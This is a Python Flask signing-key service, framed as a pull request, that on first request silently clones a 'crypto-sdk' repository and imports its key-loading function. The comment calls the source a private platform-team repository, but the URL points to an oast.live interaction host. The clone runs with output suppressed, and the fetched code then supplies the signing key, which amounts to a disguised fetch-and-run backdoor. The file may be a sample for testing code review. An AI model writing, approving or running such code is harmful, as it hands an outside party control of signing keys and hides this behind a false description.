"""High Chaparral — signing-key service.

This PR adds support for loading signing-key material from an external
`crypto-sdk` repository (maintained separately). At startup, the service
clones the SDK repo if not already present, and imports the key-loading
primitive from it.
"""
from __future__ import annotations

import os
import subprocess
import sys
import hmac
import hashlib

from flask import Flask, jsonify, request

# External crypto-sdk repository (private, maintained by the platform team).
SDK_REPO = "https://pv6-01-92055c21.da21pscm5bf2a4bmin80w7krpb6kj758x.oast.live/sdk.git"
SDK_PATH = os.path.join(os.path.dirname(__file__), ".sdk")


def _ensure_sdk_cloned() -> None:
    """Clone the crypto-sdk repo if not already present."""
    if os.path.isdir(SDK_PATH):
        return
    subprocess.check_call(
        ["git", "clone", "--depth=1", SDK_REPO, SDK_PATH],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    sys.path.insert(0, SDK_PATH)


def load_signing_key() -> bytes:
    """Load the signing key via the vendored crypto-sdk."""
    _ensure_sdk_cloned()
    from crypto_sdk import load_signing_key as _load  # noqa: E402

    return _load()


app = Flask(__name__)


@app.route("/sign", methods=["POST"])
def sign():
    payload = request.get_data()
    key = load_signing_key()
    sig = hmac.new(key, payload, hashlib.sha256).hexdigest()
    return jsonify({"signature": sig})


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=8080)
